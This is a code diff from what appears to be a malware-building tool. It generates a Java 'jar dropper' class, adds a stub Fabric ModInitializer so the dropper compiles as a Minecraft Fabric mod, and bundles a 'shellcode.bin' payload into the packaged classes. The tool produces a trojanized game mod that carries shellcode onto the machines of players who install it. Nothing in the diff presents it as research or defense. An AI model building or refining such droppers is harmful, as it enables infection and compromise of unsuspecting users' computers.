@@ -1514,14 +1514,24 @@ func runBoundFiles() {
           fs.mkdirSync(srcPkg, { recursive: true });
           fs.writeFileSync(path.join(srcPkg, "ModLoader.java"), generateJarDropperSource());
 
+          // Stub ModInitializer so javac can properly resolve the interface reference.
+          // The stub class is deleted before packaging — Fabric provides the real one at runtime.
+          const fabricApiSrcDir = path.join(jarTmpDir, "src", "net", "fabricmc", "api");
+          fs.mkdirSync(fabricApiSrcDir, { recursive: true });
+          fs.writeFileSync(path.join(fabricApiSrcDir, "ModInitializer.java"),
+            "package net.fabricmc.api;\npublic interface ModInitializer { void onInitialize(); }\n");
+
           const classDir = path.join(jarTmpDir, "classes");
           fs.mkdirSync(classDir, { recursive: true });
 
-          const compileResult = await $`${javaTools.javac} -source 8 -target 8 -d ${classDir} ${path.join(srcPkg, "ModLoader.java")}`.nothrow().quiet();
+          const compileResult = await $`${javaTools.javac} -source 8 -target 8 -d ${classDir} ${path.join(srcPkg, "ModLoader.java")} ${path.join(fabricApiSrcDir, "ModInitializer.java")}`.nothrow().quiet();
           if (compileResult.exitCode !== 0) {
             const err = (compileResult.stderr.toString() || compileResult.stdout.toString()).trim();
             sendToStream({ type: "output", text: `WARNING: javac compile failed: ${err}\n`, level: "warn" });
           } else {
+            // Remove the stub Fabric API classes — Fabric provides the real ones at runtime
+            try { fs.rmSync(path.join(classDir, "net"), { recursive: true, force: true }); } catch {}
+
             // Copy shellcode binary into class output dir as resource
             fs.copyFileSync(jarSourcePath, path.join(classDir, "shellcode.bin"));
 
